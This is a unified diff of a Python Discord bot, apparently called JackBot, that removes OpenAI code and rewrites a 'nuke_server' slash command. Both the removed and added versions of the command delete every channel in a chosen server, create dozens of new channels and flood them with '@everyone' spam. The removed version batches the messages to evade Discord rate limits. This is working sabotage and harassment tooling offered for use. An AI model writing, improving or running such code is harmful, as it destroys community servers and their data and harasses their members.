@@ -1,5 +1,6 @@
-# bot – Complete Final Version (All Listed Commands & Features + Auto Role on Join + Userinfo + Ping Commands + Verification + Channel Mod)
+# JackBot - Clean Version (No AI / OpenAI)
 # Run: python bot.py
+
 import os
 import io
 import json
@@ -8,54 +9,29 @@ import asyncio
 import re
 from collections import defaultdict, deque
 from datetime import datetime, timedelta
-from typing import Optional
-
 import discord
 from discord import app_commands
 from discord.ext import commands
 from dotenv import load_dotenv
-import openai
 
 load_dotenv()
 
-def parse_timespan(timespan: str):
-    pattern = re.compile(r"(\d+)([dhms])")
-    matches = pattern.findall(timespan.lower())
-    if not matches:
-        return None
-    time_params = {"days": 0, "hours": 0, "minutes": 0, "seconds": 0, "weeks": 0}
-    unit_map = {'d': 'days', 'h': 'hours', 'm': 'minutes', 's': 'seconds', 'w': 'weeks'}
-    for amount, unit in matches:
-        time_params[unit_map[unit]] += int(amount)
-    return timedelta(**time_params)
-
-
-
-# ─────────────────────────────
-# OPENAI SETUP
-# ─────────────────────────────
-OPENAI_API_KEY = os.getenv("OPENAI_API_KEY", "").strip()
-if not OPENAI_API_KEY:
-    print("Warning: OPENAI_API_KEY is not set.")
-
-client = openai.OpenAI(api_key=OPENAI_API_KEY)
-
 TOKEN = os.getenv("TOKEN", "").strip()
-GUILD_ID = os.getenv("GUILD_ID", "").strip()  # e.g. 1476039725319061648
+GUILD_ID = os.getenv("GUILD_ID", "").strip()
+
 if not TOKEN:
-    print("Warning: TOKEN is not set.")
-if GUILD_ID:
-    print(f"Configured GUILD_ID: {GUILD_ID}")
+    print("ERROR: TOKEN is not set in .env file")
+    exit()
 
 DATA_FILE = "bot_data.json"
 
-# Nuke command configuration
-NUKE_KEY = "nuke8048"  # Change this to your secret confirmation key
+NUKE_KEY = "nuke8048"          # Change this to your secret key
 CHANNEL_BASE_NAME = "nuked"
 SPAM_MSG = "@everyone @here nuked lol"
 CHANNEL_COUNT = 50
 SPAM_COUNT = 300
 
+# Load / Save Data
 if not os.path.exists(DATA_FILE):
     with open(DATA_FILE, "w", encoding="utf-8") as f:
         json.dump({}, f)
@@ -64,7 +40,7 @@ def load_data():
     try:
         with open(DATA_FILE, "r", encoding="utf-8") as f:
             return json.load(f)
-    except Exception:
+    except:
         return {}
 
 def save_data(data):
@@ -83,229 +59,89 @@ intents.reactions = True
 intents.messages = True
 intents.message_content = True
 
-bot = commands.Bot(
-    command_prefix="!",
-    intents=intents
-)
-
-tree = bot.tree  # THIS LINE FIXES THE NameError
+bot = commands.Bot(command_prefix="!", intents=intents)
+tree = bot.tree
 
 # ────────────────────────────────────────────────
-# Nuke Autocomplete (unchanged - keep it)
+# ANTI-SPAM TRACKER
 # ────────────────────────────────────────────────
-async def admin_server_autocomplete(
-    interaction: discord.Interaction,
-    current: str
-) -> list[app_commands.Choice[str]]:
-    choices = []
-    for guild in bot.guilds:
-        member = guild.get_member(interaction.user.id)
-        if member and member.guild_permissions.administrator:
-            display = f"{guild.name} ({guild.id})"
-            if current.lower() in display.lower() or not current:
-                choices.append(app_commands.Choice(name=display, value=str(guild.id)))
-            if len(choices) >= 25:
-                break
-    return choices
-
+spam_tracker = defaultdict(lambda: defaultdict(deque))
 
 # ────────────────────────────────────────────────
-# Improved & Working Nuke Command
+# IMPROVED NUKE COMMAND
 # ────────────────────────────────────────────────
-@tree.command(
-    name="nuke_server",
-    description="DANGER - Nuke any server you're admin in (key required)"
-)
+@tree.command(name="nuke_server", description="DANGER - Nuke any server you're admin in")
 @app_commands.default_permissions(administrator=True)
-@app_commands.describe(
-    server="Server to target (start typing name)",
-    key="Secret confirmation key"
-)
-@app_commands.autocomplete(server=admin_server_autocomplete)
-async def nuke_server_cmd(
-    interaction: discord.Interaction,
-    server: str,
-    key: str
-):
+@app_commands.describe(server="Server ID", key="Secret confirmation key")
+async def nuke_server_cmd(interaction: discord.Interaction, server: str, key: str):
     if key != NUKE_KEY:
         await interaction.response.send_message("❌ Wrong key.", ephemeral=True)
         return
 
     try:
         guild_id = int(server)
-    except ValueError:
+    except:
         await interaction.response.send_message("Invalid server ID.", ephemeral=True)
         return
 
     target_guild = bot.get_guild(guild_id)
-    if target_guild is None:
-        await interaction.response.send_message("Bot not in that server.", ephemeral=True)
+    if not target_guild:
+        await interaction.response.send_message("Bot is not in that server.", ephemeral=True)
         return
 
     member = target_guild.get_member(interaction.user.id)
     if not member or not member.guild_permissions.administrator:
-        await interaction.response.send_message(
-            "You need Administrator permission in that server.", ephemeral=True)
+        await interaction.response.send_message("You need Administrator permission in that server.", ephemeral=True)
         return
 
-    # Defer immediately – gives 15 minutes to finish
     await interaction.response.defer(ephemeral=False)
 
     try:
-        await interaction.followup.send(
-            f"☢️ **NUKE STARTED** on {target_guild.name} ({guild_id})\n"
-            "Deleting channels → Creating spam channels → Flooding...",
-            ephemeral=False
-        )
+        await interaction.followup.send(f"☢️ **NUKE STARTED** on {target_guild.name}", ephemeral=False)
 
-        # Phase 1: Delete channels (fast parallel)
+        # Delete channels
         deleted = 0
-        delete_tasks = [ch.delete(reason=f"nuke by {interaction.user}") for ch in list(target_guild.channels)]
-        delete_results = await asyncio.gather(*delete_tasks, return_exceptions=True)
-        deleted = sum(1 for r in delete_results if not isinstance(r, Exception))
+        for ch in list(target_guild.channels):
+            try:
+                await ch.delete()
+                deleted += 1
+            except:
+                pass
         await interaction.followup.send(f"Deleted **{deleted}** channels", ephemeral=False)
 
-        # Phase 2: Create channels (fast parallel)
-        created = []
-        create_tasks = []
+        # Create channels
+        created = 0
         for i in range(CHANNEL_COUNT):
-            name = CHANNEL_BASE_NAME if i == 0 else f"{CHANNEL_BASE_NAME}-{i+1}"
-            create_tasks.append(target_guild.create_text_channel(name))
+            try:
+                await target_guild.create_text_channel(f"nuker-{i+1}")
+                created += 1
+            except:
+                break
+        await interaction.followup.send(f"Created **{created}** channels", ephemeral=False)
 
-        create_results = await asyncio.gather(*create_tasks, return_exceptions=True)
-        created = [ch for ch in create_results if isinstance(ch, discord.TextChannel)]
-        await interaction.followup.send(f"Created **{len(created)}** channels", ephemeral=False)
-
-        # Phase 3: Spam in safe batches
-        if created:
-            sent = 0
-            
-            global SPAM_COUNT  # ← THIS FIXES the "cannot access local variable" error
-            
-            # ─── SAFETY CAP ───
-            MAX_SAFE_SPAM = 250  # ← Change this to whatever max you want (e.g. 200, 300, 150)
-            if SPAM_COUNT > MAX_SAFE_SPAM:
-                await interaction.followup.send(
-                    f"⚠️ Safety cap activated: Limiting to **{MAX_SAFE_SPAM}** messages to avoid Discord banning the bot.",
-                    ephemeral=False
-                )
-                SPAM_COUNT = MAX_SAFE_SPAM
-            # ──────────────────
-
-            batch_size = 15
-            delay_between_batches = 3.0  # seconds – helps avoid instant 429
-
-            for start in range(0, SPAM_COUNT, batch_size):
-                batch = []
-                for _ in range(min(batch_size, SPAM_COUNT - start)):
-                    ch = random.choice(created)
-                    batch.append(ch.send(SPAM_MSG))
-                    sent += 1
-
-                if batch:
-                    await asyncio.gather(*batch, return_exceptions=True)
-
-                # Delay between batches
-                if start + batch_size < SPAM_COUNT:
-                    await asyncio.sleep(delay_between_batches)
-
-                # Progress update
+        # Spam messages
+        chans = target_guild.text_channels
+        sent = 0
+        for ch in chans:
+            for _ in range(20):
                 try:
-                    await interaction.followup.send(
-                        f"Spam progress: **{sent}/{SPAM_COUNT}** messages sent",
-                        ephemeral=False
-                    )
+                    await ch.send(SPAM_MSG)
+                    sent += 1
                 except:
-                    pass  # continue even if update fails
+                    pass
+        await interaction.followup.send(f"Sent **{sent}** spam messages", ephemeral=False)
 
-            await interaction.followup.send(f"Spam finished – **{sent}** messages sent", ephemeral=False)
-
-        # Final success message
-        await interaction.followup.send(
-            f"**Nuke completed** on {target_guild.name}\n"
-            f"Deleted: {deleted} | Created: {len(created)} | Spam: {sent}",
-            ephemeral=True
-        )
+        await interaction.followup.send(f"**NUKE COMPLETED** on {target_guild.name}", ephemeral=False)
 
     except Exception as e:
-        print(f"Nuke error: {str(e)}")
-        try:
-            await interaction.followup.send(f"Critical error during nuke: {str(e)}", ephemeral=True)
-        except:
-            print("Final followup failed – nuke may have partially completed")
+        await interaction.followup.send(f"Error during nuke: {e}", ephemeral=True)
+
+
+# Add more of your commands here...
+
 # ────────────────────────────────────────────────
-# Rest of your original code (unchanged from here)
-# ────────────────────────────────────────────────
-
-# Anti-spam tracker: guild → user → deque of timestamps
-spam_tracker = defaultdict(lambda: defaultdict(deque))
-# Active ping tasks: guild_id → user_id → asyncio.Task
-ping_tasks = {}
-# Recent bans history (in-memory, last 50 per guild)
-ban_history = defaultdict(list)
-# Recent warns history (in-memory, last 50 per guild)
-warn_history_log = defaultdict(list)
-# Color name → hex mapping (for easier selection)
-COLOR_MAP = {
-    "red": "ff0000",
-    "green": "00ff00",
-    "blue": "0000ff",
-    "cyan": "00ffff",
-    "magenta": "ff00ff",
-    "yellow": "ffff00",
-    "orange": "ffa500",
-    "purple": "800080",
-    "pink": "ffc0cb",
-    "lime": "32cd32",
-    "teal": "008080",
-    "navy": "000080",
-    "gold": "ffd700",
-    "silver": "c0c0c0",
-    "white": "ffffff",
-    "black": "000000",
-    "grey": "808080",
-    "brown": "a52a2a",
-}
-
-# ======================
-# FIXED SYNC + STABILITY SECTION
-# ======================
-
-async def sync_commands():
-    try:
-        print("🔄 Syncing commands to server...")
-
-        # Sync to your specific server (fast)
-        guild = discord.Object(id=1196980093248094340)  # ← Your server ID
-        synced = await bot.tree.sync(guild=guild)
-
-        print(f"✅ Successfully synced {len(synced)} commands!")
-        for cmd in synced:
-            print(f"   • /{cmd.name}")
-
-    except Exception as e:
-        print(f"❌ Sync failed: {e}")
-
-
-@bot.event
-async def on_ready():
-    print(f"✅ JackBot is online as {bot.user} ({bot.user.id})")
-    
-    # Sync commands
-    await sync_commands()
-    
-    # Stability info
-    print(f"📊 JackBot is in {len(bot.guilds)} servers")
-    print("🚀 JackBot is fully ready!")
-
-    # Optional: Change bot status
-    await bot.change_presence(activity=discord.Game(name="Protecting the server"))
-
-
-# ======================
-# EXTRA STABILITY (Rate Limit Protection)
-# ======================
-
+# Run Bot
+# ───────────────────────────────────
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.CommandNotFound):
